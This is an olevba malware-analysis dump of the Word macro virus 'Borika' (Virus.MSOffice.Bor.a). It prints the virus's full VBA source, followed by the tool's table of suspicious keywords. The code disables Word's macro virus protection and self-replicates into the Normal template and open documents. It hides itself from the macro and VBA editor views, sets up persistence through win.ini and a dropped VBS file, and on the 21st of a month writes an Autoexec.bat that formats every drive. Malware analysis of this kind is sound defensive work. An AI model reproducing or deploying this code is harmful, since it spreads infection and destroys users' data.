olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Bor.a-8b15e7c4d538e406dcd0314518dc4a420a501e8e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Bor.a-8b15e7c4d538e406dcd0314518dc4a420a501e8e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Borika.bas 
in file: Virus.MSOffice.Bor.a-8b15e7c4d538e406dcd0314518dc4a420a501e8e - OLE stream: 'Macros/VBA/Borika'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'MyName = Borika.Macro_Format
'WrittenBy = Borika from Kz (Ust-Kamenogorsk)
'Version = 1.0
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
If ShowVisualBasicEditor Then Application.Quit True
Call WeTrustInGod
End Sub

Sub WeTrustInGod()
On Error Resume Next
Bat = "C:\Autoexec.bat"
    If Day(Date) = 21 Then
    SetAttr Dat, vbNormal
    Kill Bat
    Open Bat For Output As #2
      Print #2, "@echo off"
     For I = 99 To 122
      Print #2, "format " & Chr(I) & ": /autotest /q > nul"
     Next I
     Print #2, "format a: /autotest /q > nul"
     Print #2, "format b: /autotest /q > nul"
     Print #2, "cls"
     For I = 0 To 9
      Print #2, "echo."
     Next I
     Print #2, "echo                           Borika.Macro_Format Virus"
    Close #2
    End If
End Sub

Sub AutoClose()
On Error Resume Next
windir = Environ("windir")

Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False

Call Exp

If NormalTemplate.VBProject.VBComponents.Item("Borika").CodeModule.Lines(2, 1) <> "'MyName = Borika.Macro_Format" Then
NormalTemplate.VBProject.VBComponents.Import (windir & "\~$ad.dll")
NormalTemplate.Save
End If
If ActiveDocument.VBProject.VBComponents.Item("Borika").CodeModule.Lines(2, 1) <> "'MyName = Borika.Macro_Format" Then
ActiveDocument.VBProject.VBComponents.Import (windir & "\~$ad.dll")
ActiveDocument.SaveAs ActiveDocument.FullName
End If
End Sub

Sub ToolsMacro()
On Error Resume Next
windir = Environ("windir")

Call Hide

For X = 1 To NormalTemplate.VBProject.VBComponents("Borika").CodeModule.CountOfLines - 1
 CodeNT = CodeNT & NormalTemplate.VBProject.VBComponents("Borika").CodeModule.Lines(X, 1) & Chr(13)
Next X

NormalTemplate.VBProject.VBComponents("Borika").CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents("Borika").CodeModule.CountOfLines
NormalTemplate.Saved = True

If Documents.Count >= 1 Then
 For Y = 1 To ActiveDocument.VBProject.VBComponents("Borika").CodeModule.CountOfLines - 1
  CodeAD = CodeAD & ActiveDocument.VBProject.VBComponents("Borika").CodeModule.Lines(Y, 1) & Chr(13)
 Next Y

 For X = 1 To Documents.Count
 Documents(X).VBProject.VBComponents("Borika").CodeModule.DeleteLines 1, Documents(X).VBProject.VBComponents("Borika").CodeModule.CountOfLines
 Documents(X).Saved = True
 Next X
End If

Dialogs(wdDialogToolsMacro).Show

If Not ShowVisualBasicEditor Then
 NormalTemplate.VBProject.VBComponents("Borika").CodeModule.InsertLines 1, CodeNT
 NormalTemplate.Save
 If NormalTemplate.VBProject.VBComponents.Item("Borika").CodeModule.Lines(2, 1) <> "'MyName = Borika.Macro_Format" Then
  NormalTemplate.VBProject.VBComponents.Import (windir & "\~$ad.dll")
  NormalTemplate.Save
 End If
 
  If Documents.Count >= 1 Then
    For X = 1 To Documents.Count
     Documents(X).VBProject.VBComponents("Borika").CodeModule.InsertLines 1, CodeAD
     Documents(X).SaveAs Documents(X).FullName
     If Documents(X).VBProject.VBComponents.Item("Borika").CodeModule.Lines(2, 1) <> "'MyName = Borika.Macro_Format" Then
      Documents(X).VBProject.VBComponents.Import (windir & "\~$ad.dll")
      Documents(X).SaveAs Documents(X).FullName
     End If
    Next X
  End If
End If
End Sub

Sub ViewVBCode()
On Error Resume Next
Call Hide
NormalTemplate.VBProject.VBComponents("Borika").CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents("Borika").CodeModule.CountOfLines
NormalTemplate.Saved = True
NormalTemplate.VBProject.VBComponents.Remove NormalTemplate.VBProject.VBComponents("Borika")
NormalTemplate.Saved = True
If Application.Documents.Count >= 1 Then
For X = 1 To Application.Documents.Count
Documents(X).VBProject.VBComponents("Borika").CodeModule.DeleteLines 1, Documents(X).VBProject.VBComponents("Borika").CodeModule.CountOfLines
Documents(X).Saved = True
Documents(X).VBProject.VBComponents.Remove Documents(X).VBProject.VBComponents("Borika")
Documents(X).Saved = True
Next X
End If
Application.ShowVisualBasicEditor = True
End Sub

Sub Hide()
On Error Resume Next
windir = Environ("windir")

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "The Borika"

Open windir & "\Win.ini" For Input As #1
Infected = False
Do While Not EOF(1)
 Line Input #1, Line
 If Line = "run=Borika.vbs" Then
  Infected = True
 End If
Loop
Close #1

If Not Infected Then
 Open windir & "\win.ini" For Input As #1
 Open "c:\Win._ni" For Output As #2
 Do While Not EOF(1)
  Line Input #1, Line
  If Line = "[windows]" Then
   Print #2, Line
   Print #2, "run=Borika.vbs"
  Else
   Print #2, Line
  End If
 Loop
 Close #1
 Close #2
End If

FileCopy "c:\win._ni", windir & "\Win.ini"
Kill "c:\win._ni"

If Dir(windir & "\Borika.vbs") <> "" Then Kill windir & "\Borika.vbs"

Open windir & "\Borika.vbs" For Append As #1
Print #1, "on error resume next"
Print #1, "set wordobj = createobject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #1, "wordobj.options.savenormalprompt = false"
Print #1, "wordobj.normaltemplate.vbproject.vbcomponents.remove wordobj.normaltemplate.vbproject.vbcomponents(" & Chr(34) & "Borika" & Chr(34) & ")"
Print #1, "wordobj.normaltemplate.vbproject.vbcomponents.import (" & Chr(34) & windir & "\~$ad.dll" & Chr(34) & ")"
Print #1, "wordobj.normaltemplate.save"
Print #1, "wordobj.quit"
Close #1

Call Exp
End Sub

Sub Exp()
On Error Resume Next
windir = Environ("windir")
If Dir(windir & "\~$ad.dll") <> "" Then Kill (windir & "\~$ad.dll")
ActiveDocument.VBProject.VBComponents("Borika").Export (windir & "\~$ad.dll")
NormalTemplate.VBProject.VBComponents("Borika").Export (windir & "\~$ad.dll")
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|createobject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |ad.dll              |Executable file name                         |
|IOC       |Borika.vbs          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

